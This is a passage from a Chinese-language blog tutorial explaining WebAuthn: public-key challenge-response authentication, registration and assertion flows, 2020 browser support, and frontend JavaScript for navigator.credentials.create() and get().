中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 